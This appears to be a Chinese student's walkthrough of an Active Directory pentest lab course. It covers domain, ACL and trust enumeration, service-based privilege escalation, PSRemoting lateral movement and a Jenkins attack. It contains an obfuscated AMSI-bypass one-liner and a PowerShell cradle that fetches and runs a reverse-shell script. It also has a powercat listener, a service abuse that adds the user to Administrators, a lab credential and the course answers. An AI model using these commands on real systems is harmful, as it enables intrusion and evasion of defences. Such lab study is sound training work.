# 客户端远程连接
下载工具：
https://mremoteng.org/download

# 绕过AMSI
```
S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) ([TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( Get-varI`A`BLE (('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(("{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( "{2}{4}{0}{1}{3}" -f('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
```

# Learning Objective - 1

## 我是谁
```

PS C:\AD> whoami /all

USER INFORMATION
----------------

User Name        SID
================ ==============================================
dcorp\student366 S-1-5-21-1874506631-3219952063-538504511-45144


GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                           Attributes
========================================== ================ ============================================= ==================================================
Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Desktop Users               Alias            S-1-5-32-555                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\REMOTE INTERACTIVE LOGON      Well-known group S-1-5-14                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE                   Well-known group S-1-5-4                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
LOCAL                                      Well-known group S-1-2-0                                       Mandatory group, Enabled by default, Enabled group
dcorp\RDPUsers                             Group            S-1-5-21-1874506631-3219952063-538504511-1116 Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity Well-known group S-1-18-1                                      Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

## 当前域
```
PS C:\AD> get-netdomain


Forest                  : moneycorp.local
DomainControllers       : {dcorp-dc.dollarcorp.moneyco
Children                : {us.dollarcorp.moneycorp.loc
DomainMode              : Unknown
DomainModeLevel         : 7
Parent                  : moneycorp.local
PdcRoleOwner            : dcorp-dc.dollarcorp.moneycor
RidRoleOwner            : dcorp-dc.dollarcorp.moneycor
InfrastructureRoleOwner : dcorp-dc.dollarcorp.moneycor
Name                    : dollarcorp.moneycorp.local
```

## 当前域组信息
```
PS C:\AD> Get-NetGroup
Administrators
Users
Guests
Print Operators
Backup Operators
Replicator
Remote Desktop Users
Network Configuration Operators
Performance Monitor Users
Performance Log Users
Distributed COM Users
IIS_IUSRS
Cryptographic Operators
Event Log Readers
Certificate Service DCOM Access
RDS Remote Access Servers
RDS Endpoint Servers
RDS Management Servers
Hyper-V Administrators
Access Control Assistance Operators
Remote Management Users
System Managed Accounts Group
Storage Replica Administrators
Domain Computers
Domain Controllers
Cert Publishers
Domain Admins
Domain Users
Domain Guests
Group Policy Creator Owners
RAS and IAS Servers
Server Operators
Account Operators
Pre-Windows 2000 Compatible Access
Windows Authorization Access Group
Terminal Server License Servers
Allowed RODC Password Replication Group
Denied RODC Password Replication Group
Read-only Domain Controllers
Cloneable Domain Controllers
Protected Users
Key Admins
DnsAdmins
DnsUpdateProxy
RDPUsers
```


## 域中所有用户
```
PS C:\AD> get-netuser |selec

cn
--
Administrator
Guest
DefaultAccount
krbtgt
ci admin
sql admin
web svc
srv admin
app admin
mgmt admin
svc admin
studentadmin
sql1 admin
test da
Control359User
Control360User
Control361User
Control362User
Control363User
Control364User
Control365User
Control366User
Control367User
Control368User
Control369User
Control370User
Support359User
Support360User
Support361User
Support362User
Support363User
Support364User
Support365User
Support366User
Support367User
Support368User
Support369User
Support370User
VPN359User
VPN360User
VPN361User
VPN362User
VPN363User
VPN364User
VPN365User
VPN366User
VPN367User
VPN368User
VPN369User
VPN370User
student359
student360
student361
student362
student363
student364
student365
student366
student367
student368
student369
student370
Spiderman
```

## 当前域中计算机列表
```
PS C:\AD> Get-NetComputer
dcorp-dc.dollarcorp.moneycorp.local
dcorp-mgmt.dollarcorp.moneycorp.local
dcorp-ci.dollarcorp.moneycorp.local
dcorp-mssql.dollarcorp.moneycorp.local
dcorp-adminsrv.dollarcorp.moneycorp.loc
dcorp-appsrv.dollarcorp.moneycorp.local
dcorp-sql1.dollarcorp.moneycorp.local
dcorp-stdadm.dollarcorp.moneycorp.local
dcorp-std359.dollarcorp.moneycorp.local
dcorp-std360.dollarcorp.moneycorp.local
dcorp-std361.dollarcorp.moneycorp.local
dcorp-std362.dollarcorp.moneycorp.local
dcorp-std363.dollarcorp.moneycorp.local
dcorp-std364.dollarcorp.moneycorp.local
dcorp-std365.dollarcorp.moneycorp.local
dcorp-std366.dollarcorp.moneycorp.local
dcorp-std367.dollarcorp.moneycorp.local
dcorp-std368.dollarcorp.moneycorp.local
dcorp-std369.dollarcorp.moneycorp.local
dcorp-std370.dollarcorp.moneycorp.local
```

## 获取域管理员组所有成员
```
PS C:\AD> Get-NetGroupMember -GroupName "Domain Admins" -Recurse


GroupDomain  : dollarcorp.moneycorp.local
GroupName    : Domain Admins
MemberDomain : dollarcorp.moneycorp.local
MemberName   : Spiderman
MemberSID    : S-1-5-21-1874506631-3219952063-538504511-68101
IsGroup      : False
MemberDN     : CN=Spiderman,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local

GroupDomain  : dollarcorp.moneycorp.local
GroupName    : Domain Admins
MemberDomain : dollarcorp.moneycorp.local
MemberName   : svcadmin
MemberSID    : S-1-5-21-1874506631-3219952063-538504511-1122
IsGroup      : False
MemberDN     : CN=svc admin,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local

GroupDomain  : dollarcorp.moneycorp.local
GroupName    : Domain Admins
MemberDomain : dollarcorp.moneycorp.local
MemberName   : Administrator
MemberSID    : S-1-5-21-1874506631-3219952063-538504511-500
IsGroup      : False
MemberDN     : CN=Administrator,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local

```

域管理员：Spiderman，svcadmin，Administrator


因为这不是根域，所以下面命令无显示
```Get-NetGroupMember -GroupName "Enterprise Admins"```

需要加上根域的名称：moneycorp.local
```
PS C:\AD> Get-NetGroupMember -GroupName "Enterprise Admins" -Domain moneycorp.local


GroupDomain  : moneycorp.local
GroupName    : Enterprise Admins
MemberDomain : moneycorp.local
MemberName   : Administrator
MemberSID    : S-1-5-21-280534878-1496970234-700767426-500
IsGroup      : False
MemberDN     : CN=Administrator,CN=Users,DC=moneycorp,DC=local
```

问题：SID of the member of the Enterprise Admins group
答案：S-1-5-21-280534878-1496970234-700767426-500

# Learning Objective - 2

## 获取所有OU
```
 Get-NetOU -FullData
```

## 获取所有GPO
```
Get-NetGPO -FullData
```


## 获取OUName是StudentMachines的全部信息
```
PS C:\AD> Get-NetOU -OUName StudentMachines -FullData

usncreated            : 65752
name                  : StudentMachines
gplink                : [LDAP://cn={3E04167E-C2B6-4A9A-8FB7-C811158DC97C},cn=policies,cn=system,DC=dollarcorp,DC=moneycorp,DC=local;0]
whenchanged           : 2/19/2019 7:04:25 AM
objectclass           : {top, organizationalUnit}
usnchanged            : 65837
dscorepropagationdata : {5/3/2020 9:04:05 AM, 5/3/2020 9:04:05 AM, 5/3/2020 9:04:05 AM, 2/21/2019 3:13:33 PM...}
adspath               : LDAP://OU=StudentMachines,DC=dollarcorp,DC=moneycorp,DC=local
distinguishedname     : OU=StudentMachines,DC=dollarcorp,DC=moneycorp,DC=local
ou                    : StudentMachines
whencreated           : 2/19/2019 7:01:04 AM
instancetype          : 4
objectguid            : 284a1630-3d96-45c6-99a0-1f8d138f29d5
objectcategory        : CN=Organizational-Unit,CN=Schema,CN=Configuration,DC=moneycorp,DC=local

```

可以看到gplink里的GOPName是：{3E04167E-C2B6-4A9A-8FB7-C811158DC97C}


## 获取指派给这个GPOname的OU
```
PS C:\AD> Get-NetGPO -GPOname "{3E04167E-C2B6-4A9A-8FB7-C811158DC97C}"


usncreated               : 65831
displayname              : Students
gpcmachineextensionnames : [{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{D02B1F72-3407-48AE-BA88-E8213C6761F1}][{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}]
whenchanged              : 4/20/2019 6:22:16 AM
objectclass              : {top, container, groupPolicyContainer}
gpcfunctionalityversion  : 2
showinadvancedviewonly   : True
usnchanged               : 123144
dscorepropagationdata    : {5/3/2020 9:04:05 AM, 2/21/2019 12:17:00 PM, 2/19/2019 1:04:02 PM, 2/19/2019 12:55:49 PM...}
name                     : {3E04167E-C2B6-4A9A-8FB7-C811158DC97C}
adspath                  : LDAP://CN={3E04167E-C2B6-4A9A-8FB7-C811158DC97C},CN=Policies,CN=System,DC=dollarcorp,DC=moneycorp,DC=local
flags                    : 0
cn                       : {3E04167E-C2B6-4A9A-8FB7-C811158DC97C}
gpcfilesyspath           : \\dollarcorp.moneycorp.local\SysVol\dollarcorp.moneycorp.local\Policies\{3E04167E-C2B6-4A9A-8FB7-C811158DC97C}
distinguishedname        : CN={3E04167E-C2B6-4A9A-8FB7-C811158DC97C},CN=Policies,CN=System,DC=dollarcorp,DC=moneycorp,DC=local
whencreated              : 2/19/2019 7:04:25 AM
versionnumber            : 8
instancetype             : 4
objectguid               : 8ecdfe44-b617-4b9e-a9f9-4d548e5dc7b1
objectcategory           : CN=Group-Policy-Container,CN=Schema,CN=Configuration,DC=moneycorp,DC=local

```

问题：Display name of the GPO applied on StudentMachines OU
答案：Students

# Learning Objective - 3

## Task

> ● Enumerate following for the dollarcorp domain:
> − ACL for the Users group
> − ACL for the Domain Admins group
> − All modify rights/permissions for the studentx


查找Users组的所有ACL

```
PS C:\AD> Get-ObjectAcl -SamAccountName "users" -ResolveGUIDs -Verbose
VERBOSE: Get-DomainSearcher search string: LDAP://DC=dollarcorp,DC=moneycorp,DC=local
VERBOSE: Get-DomainSearcher search string: LDAP://CN=Schema,CN=Configuration,DC=moneycorp,DC=local
VERBOSE: Get-DomainSearcher search string: LDAP://CN=Extended-Rights,CN=Configuration,DC=moneycorp,DC=local


InheritedObjectType   : All
ObjectDN              : CN=Users,CN=Builtin,DC=dollarcorp,DC=moneycorp,DC=local
ObjectType            : All
IdentityReference     : NT AUTHORITY\SELF
IsInherited           : False
ActiveDirectoryRights : GenericRead
PropagationFlags      : None
ObjectFlags           : None
InheritanceFlags      : None
InheritanceType       : None
AccessControlType     : Allow
ObjectSID             : S-1-5-32-545

InheritedObjectType   : All
ObjectDN              : CN=Users,CN=Builtin,DC=dollarcorp,DC=moneycorp,DC=local
ObjectType            : All
IdentityReference     : NT AUTHORITY\Authenticated Users
IsInherited           : False
ActiveDirectoryRights : GenericRead
PropagationFlags      : None
ObjectFlags           : None
InheritanceFlags      : None
InheritanceType       : None
AccessControlType     : Allow
ObjectSID             : S-1-5-32-545

...
...
```

同样的命令，查找Domain Admins组的所有ACL
```
PS C:\AD> Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs -Verbose
VERBOSE: Get-DomainSearcher search string: LDAP://DC=dollarcorp,DC=moneycorp,DC=local
VERBOSE: Get-DomainSearcher search string: LDAP://CN=Schema,CN=Configuration,DC=moneycorp,DC=local
VERBOSE: Get-DomainSearcher search string: LDAP://CN=Extended-Rights,CN=Configuration,DC=moneycorp,DC=local


InheritedObjectType   : All
ObjectDN              : CN=Domain Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
ObjectType            : All
IdentityReference     : NT AUTHORITY\Authenticated Users
IsInherited           : False
ActiveDirectoryRights : GenericRead
PropagationFlags      : None
ObjectFlags           : None
InheritanceFlags      : None
InheritanceType       : None
AccessControlType     : Allow
ObjectSID             : S-1-5-21-1874506631-3219952063-538504511-512

InheritedObjectType   : All
ObjectDN              : CN=Domain Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
ObjectType            : All
IdentityReference     : NT AUTHORITY\SYSTEM
IsInherited           : False
ActiveDirectoryRights : GenericAll
PropagationFlags      : None
ObjectFlags           : None
InheritanceFlags      : None
InheritanceType       : None
AccessControlType     : Allow
ObjectSID             : S-1-5-21-1874506631-3219952063-538504511-512

...
...
```

查找本账户（sudent366）的所有modify rights/permissions
```
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReference -match "sudent366"}
```

没有任何返回

同样的命令，查询RDPUsers组的权限
```
PS C:\AD> Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReference -match "RDPUsers"}


InheritedObjectType   : All
ObjectDN              : CN=Control359User,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
ObjectType            : All
IdentityReference     : dcorp\RDPUsers
IsInherited           : False
ActiveDirectoryRights : GenericAll
PropagationFlags      : None
ObjectFlags           : None
InheritanceFlags      : None
InheritanceType       : None
AccessControlType     : Allow
ObjectSID             : S-1-5-21-1874506631-3219952063-538504511-45101
IdentitySID           : S-1-5-21-1874506631-3219952063-538504511-1116

InheritedObjectType   : All
ObjectDN              : CN=Control360User,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
ObjectType            : All
IdentityReference     : dcorp\RDPUsers
IsInherited           : False
ActiveDirectoryRights : GenericAll
PropagationFlags      : None
ObjectFlags           : None
InheritanceFlags      : None
InheritanceType       : None
AccessControlType     : Allow
ObjectSID             : S-1-5-21-1874506631-3219952063-538504511-45102
IdentitySID           : S-1-5-21-1874506631-3219952063-538504511-1116
```


问题：ActiveDirectory Rights for RDPUsers group on the users named ControlxUser
答案：GenericAll

# Learning Objective - 4

## Task
> • Enumerate all domains in the moneycorp.local forest.
> • Map the trusts of the dollarcorp.moneycorp.local domain.
> • Map External trusts in moneycorp.local forest.
> • Identify external trusts of dollarcorp domain. Can you enumerate trusts for a trusting forest?


枚举moneycorp.local林中的所有域
```
PS C:\AD> Get-NetForestDomain -Forest moneycorp.local


Forest                  : moneycorp.local
DomainControllers       : {dcorp-dc.dollarcorp.moneycorp.local}
Children                : {us.dollarcorp.moneycorp.local}
DomainMode              : Unknown
DomainModeLevel         : 7
Parent                  : moneycorp.local
PdcRoleOwner            : dcorp-dc.dollarcorp.moneycorp.local
RidRoleOwner            : dcorp-dc.dollarcorp.moneycorp.local
InfrastructureRoleOwner : dcorp-dc.dollarcorp.moneycorp.local
Name                    : dollarcorp.moneycorp.local

Forest                  : moneycorp.local
DomainControllers       : {mcorp-dc.moneycorp.local}
Children                : {dollarcorp.moneycorp.local}
DomainMode              : Unknown
DomainModeLevel         : 7
Parent                  :
PdcRoleOwner            : mcorp-dc.moneycorp.local
RidRoleOwner            : mcorp-dc.moneycorp.local
InfrastructureRoleOwner : mcorp-dc.moneycorp.local
Name                    : moneycorp.local

Forest                  :
DomainControllers       :
Children                :
DomainMode              :
DomainModeLevel         :
Parent                  :
PdcRoleOwner            :
RidRoleOwner            :
InfrastructureRoleOwner :
Name                    : us.dollarcorp.moneycorp.local

```

枚举moneycorp.local林中的所有信任关系
```
PS C:\AD> Get-NetForestDomain -Verbose | Get-NetDomainTrust

SourceName                 TargetName                      TrustType TrustDirection
----------                 ----------                      --------- --------------
dollarcorp.moneycorp.local moneycorp.local               ParentChild  Bidirectional
dollarcorp.moneycorp.local us.dollarcorp.moneycorp.local ParentChild  Bidirectional
dollarcorp.moneycorp.local eurocorp.local                   External  Bidirectional
moneycorp.local            dollarcorp.moneycorp.local    ParentChild  Bidirectional
```


枚举dollarcorp.moneycorp.local域中的所有信任关系
```
PS C:\AD> Get-NetDomainTrust -Domain dollarcorp.moneycorp.local

SourceName                 TargetName                      TrustType TrustDirection
----------                 ----------                      --------- --------------
dollarcorp.moneycorp.local moneycorp.local               ParentChild  Bidirectional
dollarcorp.moneycorp.local us.dollarcorp.moneycorp.local ParentChild  Bidirectional
dollarcorp.moneycorp.local eurocorp.local                   External  Bidirectional
```



枚举moneycorp.local林中所有的External trusts（外部信任）

```
PS C:\AD> Get-NetForestDomain -Verbose | Get-NetDomainTrust | ?{$_.TrustType -eq "External"}

SourceName                 TargetName     TrustType TrustDirection
----------                 ----------     --------- --------------
dollarcorp.moneycorp.local eurocorp.local  External  Bidirectional
```

枚举eurocorp.local林中的所有信任关系
```
PS C:\AD> Get-NetForestDomain -Forest eurocorp.local -Verbose | Get-NetDomainTrust

SourceName     TargetName                   TrustType TrustDirection
----------     ----------                   --------- --------------
eurocorp.local eu.eurocorp.local          ParentChild  Bidirectional
eurocorp.local dollarcorp.moneycorp.local    External  Bidirectional

```

问题：Trust Direction for the trust between dollarcorp.moneycorp.local and eurocorp.local
答案：Bidirectional（双向信任）


# Learning Objective - 5（1）

## Task

> ● Exploit a service on dcorp-studentx and elevate privileges to local administrator.
> ● Identify a machine in the domain where studentx has local administrative access.
> ● Using privileges of a user on Jenkins on 172.16.3.11:8080, get admin privileges on 172.16.3.11 - the dcorp-ci server.

### 提权到local administrator
使用beRoot.exe可以清楚看到AbyssWebServer有重启的权限，并且AbyssWebServer路径没有引号，可以利用提权
```
PS C:\AD> .\beRoot.exe
|====================================================================|
|                                                                    |
|                    Windows Privilege Escalation                    |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|



################ Service ################

[!] Permission to create a service with openscmanager
True

[!] Check services that could its configuration could be modified
Permissions: change config: True / start: True / stop: True
Name: AbyssWebServer
Display Name: Abyss Web Server

Permissions: change config: True / start: True / stop: True
Name: SNMPTRAP
Display Name: SNMP Trap


[!] Path containing spaces without quotes
permissions: {'change_config': True, 'start': True, 'stop': True}
Key: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\AbyssWebServer
Full path: C:\WebServer\Abyss Web Server\WebServer\abyssws.exe --service
Name: AbyssWebServer
Writables path found:
        - C:\WebServer
```


使用privesc.ps1枚举，发现了两组疑似管理员的凭据，同样枚举到AbyssWebServer可以进行“未加引号的服务路径”提权。不过传文件过去的时候exe文件会被杀软杀掉
```
PS C:\AD> . .\privesc.ps1
PS C:\AD> Invoke-Privesc
Date of last applied patch - just use public exploits if not patched:
8/17/2020

----------------------------------------------------------------------

Files that may contain Administrator password - you know what to do with this one:
C:\Windows\panther\setupinfo
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config

----------------------------------------------------------------------

Services with space in path and not enclosed with quotes - if you have permissions run executable from different directory - exploit/windows/local/trusted_service_path:
C:\WebServer\Abyss Web Server\WebServer\abyssws.exe --service

----------------------------------------------------------------------

PATH variable entries permissions - place binary or DLL to execute before legitimate
Group: student366, Permissions: FullControl on C:\Python27\
Group: Users, Permissions: AppendData on C:\Program Files\Java\jdk-11.0.2\bin
Group: Users, Permissions: CreateFiles on C:\Program Files\Java\jdk-11.0.2\bin

----------------------------------------------------------------------

System32 directory permissions - backdoor windows binaries:
Permissions set on System32 directory are correct for all groups.

----------------------------------------------------------------------

System32 files and directories permissions - backdoor windows binaries:
Group: Users, Permissions: CreateFiles, ReadAndExecute, Synchronize on C:\Windows\system32\spool\drivers\color

----------------------------------------------------------------------
```


## PowerUp.ps1

枚举所有“未加引号的服务路径”
```
PS C:\AD> . .\PowerUp.ps1
PS C:\AD> Get-ServiceUnquoted


ServiceName    : AbyssWebServer
Path           : C:\WebServer\Abyss Web Server\WebServer\abyssws.exe --service
ModifiablePath : @{ModifiablePath=C:\WebServer; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AbyssWebServer' -Path <HijackPath>
CanRestart     : True

ServiceName    : AbyssWebServer
Path           : C:\WebServer\Abyss Web Server\WebServer\abyssws.exe --service
ModifiablePath : @{ModifiablePath=C:\WebServer; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AbyssWebServer' -Path <HijackPath>
```

```
PS C:\WebServer> whoami
dcorp\student366
PS C:\WebServer> Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\student366'

ServiceAbused  Command
-------------  -------
AbyssWebServer net localgroup Administrators dcorp\student366 /add

```

枚举所有可以修改服务二进制文件的服务文件（ services where the current can make changes to service binary）
```

PS C:\AD> Get-ModifiableServiceFile -Verbose
VERBOSE: Add-ServiceDacl IndividualService : AbyssWebServer


ServiceName                     : AbyssWebServer
Path                            : C:\WebServer\Abyss Web Server\WebServer\abyssws.exe --service
ModifiableFile                  : C:\WebServer\Abyss Web Server\WebServer
ModifiableFilePermissions       : AppendData/AddSubdirectory
ModifiableFileIdentityReference : BUILTIN\Users
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'AbyssWebServer'
CanRestart                      : True

VERBOSE: Add-ServiceDacl IndividualService : AbyssWebServer
ServiceName                     : AbyssWebServer
Path                            : C:\WebServer\Abyss Web Server\WebServer\abyssws.exe --service
ModifiableFile                  : C:\WebServer\Abyss Web Server\WebServer
ModifiableFilePermissions       : WriteData/AddFile
ModifiableFileIdentityReference : BUILTIN\Users
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'AbyssWebServer'
CanRestart                      : True

```

enumerate services with weak service permissions.
```
 PS C:\AD> Get-ModifiableService -Verbose
VERBOSE: Add-ServiceDacl IndividualService : AbyssWebServer
VERBOSE: Current user has 'ChangeConfig' for AbyssWebServer
VERBOSE: Add-ServiceDacl IndividualService : AbyssWebServer


ServiceName   : AbyssWebServer
Path          : C:\WebServer\Abyss Web Server\WebServer\abyssws.exe --service
StartName     : LocalSystem
AbuseFunction : Invoke-ServiceAbuse -Name 'AbyssWebServer'
CanRestart    : True

```

问题：Service abused on the student VM for local privilege escalation
答案：AbyssWebServer


根据Get-ModifiableService枚举的结果，使用Invoke-ServiceAbuse，把当前账号添加到本地管理员组
```
PS C:\AD>
PS C:\AD> Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\student366'

ServiceAbused  Command
-------------  -------
AbyssWebServer net localgroup Administrators dcorp\student366 /add
```

# Learning Objective - 5（2）

查找本地管理员可以用powershell远程登录的电脑
```
PS C:\AD> . .\Find-PSRemotingLocalAdminAccess.ps1
PS C:\AD> Find-PSRemotingLocalAdminAccess
dcorp-adminsrv
dcorp-std366
```
可以看到可以远程登录两台电脑，一台是本机，一台是dcorp-adminsrv

问题：Script used for hunting for admin privileges using PowerShell Remoting
答案：Find-PSRemotingLocalAdminAccess.ps1



现在我们可以用Enter-PSSession横向移动到另一台电脑dcorp-adminsrv（计算机全称=dcorp-adminsrv.dollarcorp.moneycorp.local，见上面当前域的计算机列表的枚举）

```
PS C:\AD> ipconfig

Windows IP Configuration


Ethernet adapter Ethernet 3:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::34d5:8394:57f3:7610%3
   IPv4 Address. . . . . . . . . . . : 172.16.100.66
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 172.16.100.254

Tunnel adapter isatap.{6B6E4BEE-3BB9-4E5E-8522-6AC909EEF3D6}:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . :

PS C:\AD> Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local

[dcorp-adminsrv.dollarcorp.moneycorp.local]: PS C:\Users\student366\Documents> whoami
dcorp\student366

[dcorp-adminsrv.dollarcorp.moneycorp.local]: PS C:\Users\student366\Documents> ipconfig

Windows IP Configuration


Ethernet adapter Ethernet:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::4de0:a61b:db3f:172c%2
   IPv4 Address. . . . . . . . . . . : 172.16.4.101
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 172.16.4.254

Tunnel adapter isatap.{5A335808-BE49-450F-AFA2-F08ED9EF5EEF}:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . :
```

# Learning Objective - 5（3）

Jenkins 登录账号信息是：
```builduser:builduser```

文档说是手动枚举出来，我觉得这也太扯了。。

问题：Jenkins user used to access Jenkins web console
答案：builduser

# Learning Objective - 5（4）

powercat监听
```
PS C:\AD> . .\powercat.ps1
PS C:\AD> powercat -l -v -p 443 -t 100
VERBOSE: Set Stream 1: TCP
VERBOSE: Set Stream 2: Console
VERBOSE: Setting up Stream 1...
VERBOSE: Listening on [0.0.0.0] (port 443)
```
因为本机装了python2，用python搭一个简单的http server

```
python -m SimpleHTTPServer 80
```

在Jenkins里我用下面payload一直反弹不了shell

```powershell.exe iex (iwr http://172.16.100.66/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress 172.16.100.66 -Port 443```

提示无法从我本机下载脚本，不知道是不是网络问题

但是可以执行其他命令得知Jenkins是由哪个用户运行的，使用```whoami /all```

问题：Domain user used for running Jenkins service on dcorp-ci
答案：ciadmin


